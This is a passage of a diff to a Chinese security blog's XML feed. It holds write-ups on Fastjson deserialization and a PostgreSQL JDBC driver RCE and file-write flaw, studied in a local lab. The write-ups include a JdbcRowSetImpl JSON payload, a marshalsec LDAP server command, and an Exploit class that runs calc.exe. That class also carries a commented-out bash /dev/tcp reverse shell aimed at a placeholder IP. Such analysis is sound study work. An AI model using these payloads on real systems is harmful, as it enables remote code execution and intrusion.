-<li>Externalizable接口<br><img src="https://i-blog.csdnimg.cn/blog_migrate/212c7e8b414b9efadc307060d698e207.png" alt="在这里插入图片描述"><br>可以看到Externalizable继承了Serializable接口，并添加了自己的方法。<br>因为这个原因，我们在demo中首先编写了一个UnserializeTest类用于被序列化，该类中重写了readObject方法，个人感觉也不算是重写，因为没有@override注解，应该是应为作用域的缘故导致在调用的时候先只能执行了本类中的readObject方法，在该类中我们执行了操作系统命令弹出一个计算机，并打印了一段话。<br>demo代码运行的结果就是，会在控制台打印：</li>
-</ul>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">执行了readObject函数！！</span></span><br><span class="line"><span class="string">armandhe</span></span><br></pre></td></tr></table></figure>
-<p>并生成一个Userilize.txt文件和弹出计算机，如下图：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5cacf695b502f8230904fb0374ca5a4c.png" alt="在这里插入图片描述"><br>我们通过常规的方式打开Unserilize.txt会看到一堆乱码：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/41d8629728724b938a6fcdbe4839f1b8.png" alt="在这里插入图片描述"><br>所以我们使用linux的xxd命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xxd Unserilize.txt</span><br></pre></td></tr></table></figure>
-<p>或者在windows中使用010editor打开它：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f9292c92bd8d12b06758601d1ac4f7c.png" alt="在这里插入图片描述"><br>需要注意的特征是，开头的ACED0005，这个是java序列化数据的特征，有助于我们快速定位程序的反序列化利用点。其实后面的73 72也有特定的含义，不过具体的我忘记了，感兴趣的朋友可以自行查询。我们可以利用工具对该数据进行解析：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/407450606885d51de67358e3bcf93471.png" alt="在这里插入图片描述"><br>这样我们就可以看到对象序列化之前对应的类，以及其中其中的可被序列化的methods与fields。<br>常规java序列化调用的是writeObject方法，反序列化则调用的是readObject方法，如果目标类在实现的时候重写了readObject方法想我们的demo代码一样，并包含有一些危险的操作的参数是用户可控的话，那么就可能导致反序列化漏洞。</p>
-<h2 id="Fastjson序列化与反序列化-1"><a href="#Fastjson序列化与反序列化-1" class="headerlink" title="Fastjson序列化与反序列化"></a>Fastjson序列化与反序列化</h2><p>Fastjson可以将JSONObject或者javaBean序列化为JSON字符串。关于javaBean的只是可以参考廖雪峰的网站：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">javaBean是什么</a></p>
-<p>Fastjson在对javaBean进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的set方法，我们可以看下面的代码，如果这个set方法中含有一些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令：<br>首先我们准备一个javaBean，FastjsonUnserilizeTest.java</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getname方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setname方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getage方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setage方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后是序列化与反序列化代码,FastjsonUnserilizeMain.java：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//新建对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;新建对象：&quot;</span>);</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line">        fastjsonUnserilizeTest.setName(<span class="string">&quot;armband&quot;</span>);</span><br><span class="line">        fastjsonUnserilizeTest.setAge(<span class="number">24</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n序列化：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n反序列化：&quot;</span>);</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest1</span> <span class="operator">=</span> JSON.parseObject(s, FastjsonUnserilizeTest.class);</span><br><span class="line">        System.out.println(fastjsonUnserilizeTest1);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fastjsonUnserilizeTest1.getName();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行后控制控制台打印：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e04a4f51c024bbfa1ca69f40ba0493cb.png" alt="在这里插入图片描述"><br>第一部分是在我们新建对象的时候调用了两次set方法<br>第二部分是在序列化的时候调用了get方法<br>第三部分是在反序列化的时候调用了set方法<br>注意到Fastjson中序列化调用的是JSON.toJSONString方法，反序列化调用的是JSON.parseObject方法。</p>
-<h1 id="Fastjson发序列化漏洞原理"><a href="#Fastjson发序列化漏洞原理" class="headerlink" title="Fastjson发序列化漏洞原理"></a>Fastjson发序列化漏洞原理</h1><p>我们注意到在进行序列化操作的时候JSON.toJSONString方法有一个参数SerializerFeature.WriteClassName，这个参数就是在序列化是包含类名，也就是这个参数导致了Fastjson的反序列化漏洞，这个参数实现的功能在Fastjson中被称作AutoType，即自动类型。如果不添加这个参数我们的javaBean序列化后应该是这样的：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ded9132a1e351e460033a0f6271c6baa.png" alt="在这里插入图片描述"><br>对比一下包含有上述参数：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10feefd1c9ed9c4ffa16560dfddd199b.png" alt="在这里插入图片描述"><br>可以看到多了一个@type参数。<br>如果没有SerializerFeature.WriteClassName参数，我们在进行反序列化时，代码这样写：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s= <span class="string">&quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
-<p>这时候我们是不能控制到底要反序列化为什么类型的对象的，只能开发者在代码中指定好，如这样：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/21ae2fde7d3075a1f2e5479f21fe8053.png" alt="在这里插入图片描述"><br>而如果我们在序列化的时候添加了该参数，我们则可以在反序列化的时候通过控制@type键的值来控制该序列化数据要被反序列化为什么样的对象，即调用什么类的set 方法，接下来要用到的就是找到这样一个类可以被用来完成我们想要的功能。<br>其中一个类是：com.sun.rowset.JdbcRowSetImpl<br>我们查看以下这个类，定位到setDataSource方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a2966598772acdc06ae5b39e34722680.png" alt="在这里插入图片描述"><br>这段代码首先判断了this.getDataSourceName（）是否为空，我们定位到getDataSourceName（）方法处查看一下他的返回值：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/87dc01881a8358a40c7bfe72f7d5fcf1.png" alt="在这里插入图片描述"><br>返回dataSource，是一个字符串类型，那么我们在反序列化调用set方法时dataSource首先是没有值的，也就是说this.getDataSourceName（）的返回值为null，这逻辑进入到else部分，调用了父类的setDataSourceName，并将var1传了进去。其实这一串都不重要，只需要知道反序列化的时候会自动调用setDataSourceName为DataSourceName赋值就可以了。<br>再在com.sun.rowset.JdbcRowSetImpl类中定位到setAutocommit方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8ee66d941bcb77f16736b104d5f7c0fb.png" alt="在这里插入图片描述"><br>在定位到this.connect方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b8ade61e0a47e61d179d1ac8b336e53e.png"><br>在这里我们注意到有个lookup方法，该方法就是JNDI中访问远程服务器获取远程对象的方法，其参数为服务器地址。如果其参数可控那么就可能被攻击，而this.getDataSourceName是获取DataSourceName的值得方法，那么我们只要控制了this.setDataSourceName方法的参数就可以访问我们自己的服务器了。而我们知道Fastjson在反序列化的时候会调用所有的set方法，正好可以通过setDataSourceName对DataSourceName进行赋值。于是，我们就有了这样的Fastjson序列化数据：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://localhost:1099/POC&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>这儿autoCommit好像必须设置为true，为啥我忘记了，昨天看的，待会儿去找找！！<br>漏洞的原理就是这样，接下来就是复现了，好紧张。。。。</p>
-<h1 id="一次失败的复现"><a href="#一次失败的复现" class="headerlink" title="一次失败的复现"></a>一次失败的复现</h1><p>我们利用现有的靶场环境：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f1837d42ed28a8665c28ff8a57ee392.png" alt="在这里插入图片描述"><br>将含有漏洞的war包直接放到tomcat的webapps目录下，然后启动tomcat就可以了，访问下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/efdb2e55d3a0a078768e9bb6da82d399.png" alt="在这里插入图片描述"><br>出啊先helloword则代表靶场搭建完毕，然后我们去看看这个war包怎么写的：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7b75e64d29cf5cdfbb7d971f319d98d2.png" alt="在这里插入图片描述"><br>这里有两个文件，主要的逻辑在过滤器那个类中，我直接给他粘出来：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> spark.Spark;</span><br><span class="line"><span class="keyword">import</span> spark.servlet.SparkApplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexFilter</span> <span class="keyword">implements</span> <span class="title class_">SparkApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        Spark.get(<span class="string">&quot;/&quot;</span>, (req, res) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        Spark.post(<span class="string">&quot;/&quot;</span>, (request, response) -&gt; &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> request.body();</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(data, <span class="keyword">new</span> <span class="title class_">Feature</span>[]&#123;Feature.SupportNonPublicField&#125;);</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">            ret.put(<span class="string">&quot;success&quot;</span>, <span class="number">200</span>);</span><br><span class="line">            ret.put(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;Hello &quot;</span> + obj.get(<span class="string">&quot;name&quot;</span>) + <span class="string">&quot;, Your age is &quot;</span> + obj.get(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">            response.status(<span class="number">200</span>);</span><br><span class="line">            response.type(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ret.toJSONString();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IndexFilter</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IndexFilter</span>();</span><br><span class="line">        i.init();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>可以看到，如果请求的方法为get则返回hello word ，如果为post则对传上来的数据进行反序列化操作，并输出 你的年纪与姓名这里面有一个<br><code>new Feature[]&#123;Feature.SupportNonPublicField&#125;);             JSONObject ret = new JSONObject();             ret.put(&quot;success&quot;, 200);</code> 参数是为了让被private修饰的值也能被反序列化。<br>我们传入正常的数据：<br>get请求：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/307874e2b5c35c8af6dfb6ddaf60ff64.png" alt="在这里插入图片描述"><br>post请求：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/099df848f059bb14c7f99fcdfad49e30.png" alt="在这里插入图片描述"><br>然后传入我们构造的payload:</p>
-<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e821001f94862210776e67cb368fc013.png" alt="在这里插入图片描述"><br>在操作前记得先搭建好ldap服务器，使用的工具是marshalsec，可以在gihub上找到，命令是：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1/#Exploit&quot; 6666</span><br></pre></td></tr></table></figure>
-<p>当靶机访问该服务器的时候，会被重定向到本机的80端口上访问Exploit.class文件，Exploit.java文件中的内容为：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">      <span class="comment">//Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行了打开计算机的命令，但我的操作并没有打开计算机，据说是应为jdk版本的原因。详情见：<br><a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a><br>参考文章：<br><a href="https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">fastjson反序列化漏洞复现</a><br><a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a></p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
-        <tag>fastjson</tag>
       </tags>
   </entry>
   <entry>
@@ -1312,6 +1312,33 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
+    <title>PostgreSQL JDBC Driver RCE&amp;任意文件写入漏洞</title>
+    <url>/archives/dbd438c0.html</url>
+    <content><![CDATA[<p>上班没有任务你们都干什么，反正我是不会摸鱼的，这辈子都不可能摸鱼的，复现这个漏洞的初衷是看了某公众号关于Vmware Workspace One Access的jdbc注入漏洞，文中值分析到jdbc url可控的部分，但是我不太清楚为什么jdbc可控就会导致任意文件写入，于是上网搜了jdbc注入的文章，于是找到了这儿：</p>
+<span id="more"></span>
+<blockquote>
+<p><a href="https://paper.seebug.org/1832/">https://paper.seebug.org/1832/</a></p>
+</blockquote>
+<p>这篇文章里介绍了Mysql 的JDBC驱动可能导致的漏洞的分析，不过这好像不是我需要的，不过我还是学习了一波，具体的调用流程我还没有看，准备咋写完这篇就去看看。后来我又在刚才提到的公众号里找到了另一篇将PostGreSQL的注入分析，于是我就跟着分析了一波。这篇文章里介绍了两个漏洞一个是RCE，另一个是任意文件写入漏洞。</p>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>首先我们创建一个MAVEN项目，然后引入相关的依赖：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5ced078929b993db8057524c1e367ab0.png" alt="在这里插入图片描述"><br>然后编写一个漏洞利用POC。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/32449109031c3fc2a331e246a6cacf49.png" alt="在这里插入图片描述"><br>很明显导致漏洞的是jdbcURL的socketFactory与socketFactoryArg这两个参数，在jdbcURL的定义中，参数部分一般被称作扩展参数，其总用是指定连接数据库的一些特性。大胆cancel导致漏洞的就是这两个参数，而这个漏洞的kick-off就是DriverManager.getConnection这个类方法。那么我们接下来要做的就是不断跟踪这个函数的Chain最终找到sink点。直接开干，毫无疑问我们要使用调试模式将代码跑起来，然后键入到getConnection函数里面。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/064c6d4ca7a7331a6e695e5d01c6a6d2.png" alt="在这里插入图片描述"><br>无意义的部分我就直接放图片了，需要关注的地方我会说明<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7392fcc25dc3f316af36782dc20f0293.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/ccbaeb08422697f7a4fb4670f23057dd.png" alt="在这里插入图片描述"><br>这里注意注意第151行</p>
+<blockquote>
+<p>this.setupLoggerFromProperties(props);</p>
+</blockquote>
+<p>这与我们的任意文件写入有关，当然现在我们不关注他，这个时候我们可以看一下props的值<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ab3aaf9cdbd7f4e7a764c52c68ff5b62.png" alt="在这里插入图片描述"><br>存储的都是jdbcRUL含有的一些关键信息，具体的实现步骤我当然是一步一步看了的，有新区的可以自己看看。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d9714883310a8c2d83f1b6538fcdf8b6.png" alt="在这里插入图片描述"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9c41a90e6a0b2680b1ba52b62aa8cff6.png" alt="在这里插入图片描述"><br>这里对props进行了处理，最终生成的是一个hostSpecs类型的数组，hostSpecs对象存储了数据库连接的hostnae, port以及一个扩展参数localSocketAddress，<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8e662319025a149bd51fcb4a54792ca8.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/371c3ab18de2f8e22781466536dc56e4.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/dd9ed18eb4931c726f21b622b0886322.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ac4cbac510fe44fe69ab979e601d56d.png" alt="在这里插入图片描述"><br>这个时候可以看一波这个info存储的信息了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/403ae02a564320dedc0f27f2c54d2a05.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/df2ae255020b698ba90dea5bf60ce140.png" alt="在这里插入图片描述"><br>这里注意第三个参数<code>PGProperty.SOCKET_FACTORY_ARG</code>，PGProperty是一个枚举类型，其内部定义了get方法，实现的功能是对判断枚举项的值有没有在传入的properties中，如果在则查找返回，如果不在则返回默认值。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7ce33e988bcb94a35fd158b484e500f9.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1a4f33fffdfd9632bb4a02a46150e3ae.png" alt="在这里插入图片描述"><br>可以看到有很多的枚举项，这些内容很大一部分都是JDBC的扩展参数的可选值。<br>在我们的代码中这个值就是<code>args</code>也就是我们最开始poc设置的参数<code>socketFactoryArg</code><br>还可以看一看第一个参数的值<br><img src="https://i-blog.csdnimg.cn/blog_migrate/56340d55a62456873cb62038ab7c52f3.png" alt="在这里插入图片描述"><br>就是最开始设置的参数<code>socketFactoryClass</code><br>然后跟进这个函数<code>instantiate</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/90be4014a268634cde7e700a2425fda1.png" alt="在这里插入图片描述"><br>很明显的反射调用，第一个参数作为类名，第三个参数作为构造方法的参数，那么这个函数<code>ObjectFactory.instantiate</code>就是我们的sink点了。<br>现在我们要找到一个gadget能够在在类实例化的过程中实现RCE，作者根据jackson的历史漏洞<code>CVE-2017-17485</code>找到这么一个类<br><code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 该类在实例化的时候会下载出入的参数指定的xml文件然后获取java bean，然后通过jpel表达式执行恶意代码。<br>完整的poc长这样<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2281dffccbdcbb3e7ef26beb6c41b4d6.png" alt="在这里插入图片描述"><br>当然过去jdbc连接的用户名根本不用填，根本用不上。<br>xml文件长这样：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d32339c5218d29b8d0b34a29ee52d131.png" alt="在这里插入图片描述"><br>然后直接运行代码<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f5ff4c93c580108a6d0240e6a85db852.png" alt="在这里插入图片描述"><br>完美</p>
+<h1 id="任意文件写"><a href="#任意文件写" class="headerlink" title="任意文件写"></a>任意文件写</h1><p>这个也比较简单，上面有提到过，重点在<code>this.setupLoggerFromProperties(props);</code>里面设置了日志处理器，在调用该logger的时候就会使用该处理器将日志记录到指定的日志文件中。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2163e134a61bb522243e3e445f0eeca2.png" alt="在这里插入图片描述"><br>这里注意要设置jdbc扩展参数<code>logger_level</code>设置日志记录的级别，当然不能为off，<br><img src="https://i-blog.csdnimg.cn/blog_migrate/829303d5d04f95aadbb7c8cb22f66df3.png" alt="在这里插入图片描述"><br>设置扩展参数<code>logger_file</code>指定日志文件的路径，这里没有对路径进行过滤，所以可以进行目录穿越，将文件指定到想要的位置。</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/763faa16a6ecaf5bf292864d963eb372.png" alt="在这里插入图片描述"><br>这个文件处理器最终被添加到了<code>Parent_LOGGER</code>这个日志记录器中<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a9a2b6ea66b5222132b9b34ef86ba49e.png" alt="在这里插入图片描述"><br>在执行完<code>setupLoggerFromProperties(props)</code>后，马上就有记录日志的操作，该操作将整个jdbcUrl记录到日志中。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10dcb0eb1dd3852c53c60fd860fbd202.png" alt="在这里插入图片描述"><br>注意到这里的日志记录器并不是<code>PARENT_LOGGER</code>而是<code>LOGGER</code>，那么他是怎么调用到父记录器的呢，这个可以自己跟一下log的流程看一下怎么获取的，最终的poc与效果<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1f0bd72347a1eb74e185be6a2a08c8f9.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>任意文件写</tag>
+        <tag>Postgre</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>RMI原理浅析</title>
     <url>/archives/1298d583.html</url>
     <content><![CDATA[<p>@<a href="RMI%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90">TOC</a><br>前段时间不是爆了个log4j的远程代码执行漏洞吗！趁机我就了解了一下什么事jndi，然后就接触到了ldap与rmi，所有准备好好学习一番……</p>
@@ -1384,33 +1411,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       <tags>
         <tag>socks5</tag>
         <tag>Regeorg</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PostgreSQL JDBC Driver RCE&amp;任意文件写入漏洞</title>
-    <url>/archives/dbd438c0.html</url>
-    <content><![CDATA[<p>上班没有任务你们都干什么，反正我是不会摸鱼的，这辈子都不可能摸鱼的，复现这个漏洞的初衷是看了某公众号关于Vmware Workspace One Access的jdbc注入漏洞，文中值分析到jdbc url可控的部分，但是我不太清楚为什么jdbc可控就会导致任意文件写入，于是上网搜了jdbc注入的文章，于是找到了这儿：</p>
-<span id="more"></span>
-<blockquote>
-<p><a href="https://paper.seebug.org/1832/">https://paper.seebug.org/1832/</a></p>
-</blockquote>
-<p>这篇文章里介绍了Mysql 的JDBC驱动可能导致的漏洞的分析，不过这好像不是我需要的，不过我还是学习了一波，具体的调用流程我还没有看，准备咋写完这篇就去看看。后来我又在刚才提到的公众号里找到了另一篇将PostGreSQL的注入分析，于是我就跟着分析了一波。这篇文章里介绍了两个漏洞一个是RCE，另一个是任意文件写入漏洞。</p>
